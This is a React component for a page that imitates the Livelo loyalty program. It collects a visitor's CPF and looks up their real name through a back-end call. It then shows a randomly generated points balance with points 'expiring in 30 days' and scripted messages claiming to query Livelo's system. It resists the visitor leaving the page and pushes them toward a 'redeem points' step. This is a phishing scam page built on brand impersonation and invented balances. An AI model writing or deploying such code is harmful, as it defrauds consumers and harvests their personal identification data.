import { useState, useEffect, useCallback } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Search, CheckCircle, AlertCircle } from "lucide-react";
import LoadingOverlay from "@/components/LoadingOverlay";

function formatCpf(value: string): string {
  const digits = value.replace(/\D/g, "").slice(0, 11);
  if (digits.length <= 3) return digits;
  if (digits.length <= 6) return `${digits.slice(0, 3)}.${digits.slice(3)}`;
  if (digits.length <= 9) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
  return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
}

function validateCpf(cpf: string): boolean {
  return cpf.replace(/\D/g, "").length === 11;
}

const LOADING_DURATION = 16000;

function generatePoints() {
  const points = Math.floor(Math.random() * (150000 - 60000 + 1)) + 60000;
  const expiring = Math.floor(points * (Math.random() * 0.15 + 0.05));
  return { points, expiring };
}

function extractName(data: Record<string, unknown>): string {
  if (typeof data.nome === "string" && data.nome) return data.nome;
  if (typeof data.name === "string" && data.name) return data.name;
  if (typeof data.NOME === "string" && data.NOME) return data.NOME;
  const result = data.result as Record<string, unknown> | undefined;
  if (result && typeof result.nome === "string" && result.nome) return result.nome;
  const nested = data.data as Record<string, unknown> | undefined;
  if (nested && typeof nested.nome === "string" && nested.nome) return nested.nome;
  return "";
}

async function fetchCpfData(cpf: string): Promise<string> {
  try {
    const cleanCpf = cpf.replace(/\D/g, "");
    const res = await fetch(`/api/consulta-cpf?cpf=${cleanCpf}`);
    if (!res.ok) return "";
    const data = await res.json();
    return extractName(data);
  } catch {
    return "";
  }
}

type Phase = "form" | "loading" | "result";

const loadingMessages = [
  "Conectando ao sistema Livelo...",
  "Verificando dados do CPF...",
  "Consultando base de pontos...",
  "Analisando historico de transacoes...",
  "Calculando saldo disponivel...",
  "Verificando pontos a expirar...",
  "Validando informacoes...",
  "Finalizando consulta...",
];

export default function CpfConsulta() {
  const [, setLocation] = useLocation();
  const [cpf, setCpf] = useState("");
  const [phase, setPhase] = useState<Phase>("form");
  const [progress, setProgress] = useState(0);
  const [result, setResult] = useState<{ hasPoints: boolean; name: string; cpf: string; points: number; expiring: number } | null>(null);
  const [loadingText, setLoadingText] = useState(loadingMessages[0]);
  useEffect(() => {
    if (phase !== "loading") return;

    let cancelled = false;
    let resolvedName = "";

    const apiPromise = fetchCpfData(cpf).then((name) => {
      if (name) resolvedName = name;
    });

    const startTime = Date.now();
    const interval = setInterval(() => {
      const elapsed = Date.now() - startTime;
      const pct = Math.min((elapsed / LOADING_DURATION) * 100, 100);
      setProgress(pct);
      const msgIndex = Math.min(
        Math.floor((elapsed / LOADING_DURATION) * loadingMessages.length),
        loadingMessages.length - 1
      );
      setLoadingText(loadingMessages[msgIndex]);
      if (elapsed >= LOADING_DURATION) clearInterval(interval);
    }, 100);

    const timer = setTimeout(async () => {
      clearInterval(interval);
      await apiPromise;
      if (cancelled) return;
      const { points, expiring } = generatePoints();
      const formattedCpf = formatCpf(cpf);
      const finalName = resolvedName || "Cadastro Validado com Sucesso";
      localStorage.setItem("pontosUsuario", String(points));
      localStorage.setItem("nomeUsuario", finalName);
      setResult({ hasPoints: true, name: finalName, cpf: formattedCpf, points, expiring });
      setProgress(100);
      setPhase("result");
    }, LOADING_DURATION);

    const handleBeforeUnload = (e: BeforeUnloadEvent) => {
      e.preventDefault();
      e.returnValue = "";
    };
    window.addEventListener("beforeunload", handleBeforeUnload);

    return () => {
      cancelled = true;
      clearInterval(interval);
      clearTimeout(timer);
      window.removeEventListener("beforeunload", handleBeforeUnload);
    };
  }, [phase, cpf]);

  const handleSubmit = useCallback(() => {
    if (!validateCpf(cpf)) return;
    setProgress(0);
    setResult(null);
    setPhase("loading");
  }, [cpf]);

  const [resgateLoading, setResgateLoading] = useState(false);

  const handleResgate = useCallback(() => {
    setResgateLoading(true);
    setTimeout(() => {
      setResgateLoading(false);
      setLocation("/resgate");
    }, 4000);
  }, [setLocation]);

  const handleReset = useCallback(() => {
    setCpf("");
    setPhase("form");
    setProgress(0);
    setResult(null);
  }, []);

  const isLoading = phase === "loading";

  return (
    <>
      <div
        className="consulta-abaixo-banner relative z-10 flex flex-col items-center px-4 -mt-10 sm:-mt-10 mb-8"
        data-testid="cpf-consulta-section"
      >
        <div className="bg-white rounded-2xl shadow-md px-6 py-4 mb-4 z-10" data-testid="cpf-logo-badge">
          <img src="/images/livelo-logo.jpg" alt="Livelo" className="h-10 w-auto" data-testid="img-cpf-logo" />
        </div>

        <div
          className="w-[92%] max-w-[520px] bg-white border border-[#E5E5E5] rounded-2xl p-7 -mt-6 relative"
          style={{ boxShadow: "0 4px 12px rgba(0,0,0,0.06)" }}
        >
          {(phase === "form" || phase === "loading") && (
            <div data-testid="cpf-form" className="pt-4">
              <h3 className="text-[22px] font-bold text-[#222222] mb-2 text-center">
                Consulte seus pontos agora
              </h3>
              <p className="text-[#6F6F6F] text-sm mb-6 text-center">
                Digite seu CPF e veja se possui saldo disponivel
              </p>
              <div className="flex flex-col sm:flex-row gap-3">
                <Input
                  type="text"
                  value={cpf}
                  onChange={(e) => setCpf(formatCpf(e.target.value))}
                  onKeyDown={(e) => e.key === "Enter" && handleSubmit()}
                  placeholder="000.000.000-00"
                  maxLength={14}
                  disabled={isLoading}
                  className="flex-1 min-h-10 text-[#222222] border-[#E5E5E5] focus-visible:ring-[#EC008C]/30 focus-visible:border-[#EC008C] placeholder:text-[#AAAAAA]"
                  data-testid="input-cpf"
                />
                <Button
                  size="lg"
                  onClick={handleSubmit}
                  disabled={!validateCpf(cpf) || isLoading}
                  className="bg-[#E0007A] border-[#E0007A] text-white font-semibold w-full sm:w-auto rounded-full"
                  data-testid="button-consultar"
                >
                  <Search className="w-4 h-4 mr-2" />
                  Consultar Pontos
                </Button>
              </div>
              <p className="text-[#AAAAAA] text-xs mt-4 text-center">
                Seus dados estao protegidos conforme a LGPD
              </p>
            </div>
          )}

          {phase === "result" && result && (
            <div data-testid="cpf-result">
              {result.hasPoints ? (
                <div className="text-center">
                  <CheckCircle className="w-12 h-12 text-[#EC008C] mx-auto mb-3" />
                  <h3 className="text-[22px] font-bold text-[#222222] mb-0.5" data-testid="text-result-name">
                    {result.name}
                  </h3>
                  <p className="text-sm text-[#6F6F6F] mb-4" data-testid="text-result-cpf">
                    CPF: {result.cpf}
                  </p>
                  <div className="bg-[#FCE4F1] border border-[#EC008C] rounded-xl p-5 mb-5">
                    <p className="text-[#EC008C] text-xs uppercase tracking-wide mb-1 font-medium">
                      Pontos disponiveis
                    </p>
                    <p className="text-3xl font-bold text-[#EC008C]" data-testid="text-result-points">
                      {result.points.toLocaleString("pt-BR")}
                    </p>
                    <p className="text-[#6F6F6F] text-xs mt-1">
                      {result.expiring.toLocaleString("pt-BR")} pontos expirando em 30 dias
                    </p>
                  </div>
                  <Button
                    onClick={handleResgate}
                    className="w-full bg-[#E0007A] border-[#E0007A] text-white font-semibold rounded-full mb-3"
                    data-testid="button-negociar"
                  >
                    Resgatar Pontos
                  </Button>
                  <Button
                    variant="outline"
                    onClick={handleReset}
                    className="w-full border-[#EC008C] text-[#EC008C] rounded-full"
                    data-testid="button-nova-consulta"
                  >
                    Nova consulta
                  </Button>
                </div>
              ) : (
                <div className="text-center">
                  <AlertCircle className="w-12 h-12 text-[#AAAAAA] mx-auto mb-3" />
                  <h3 className="text-[22px] font-bold text-[#222222] mb-1" data-testid="text-no-balance">
                    Nenhum saldo encontrado
                  </h3>
                  <p className="text-sm text-[#6F6F6F] mb-2" data-testid="text-result-cpf-no-points">
                    CPF: {result.cpf}
                  </p>
                  <p className="text-sm text-[#6F6F6F] mb-5">
                    Nao encontramos pontos vinculados a este CPF.
                    Que tal comecar a juntar agora?
                  </p>
                  <Button
                    className="w-full bg-[#E0007A] border-[#E0007A] text-white font-semibold rounded-full mb-3"
                    data-testid="button-comecar"
                  >
                    Comecar a juntar pontos
                  </Button>
                  <Button
                    variant="outline"
                    onClick={handleReset}
                    className="w-full border-[#EC008C] text-[#EC008C] rounded-full"
                    data-testid="button-nova-consulta-empty"
                  >
                    Nova consulta
                  </Button>
                </div>
              )}
            </div>
          )}
        </div>
      </div>

      <LoadingOverlay
        visible={phase === "loading"}
        title="Consultando pontos no sistema Livelo..."
        subtitle={loadingText}
        duration={LOADING_DURATION}
        testId="loading-overlay"
      />

      <LoadingOverlay
        visible={resgateLoading}
        title="Validando seus pontos..."
        subtitle="Preparando opcoes de resgate..."
        duration={4000}
        testId="loading-resgate-overlay"
      />
    </>
  );
}
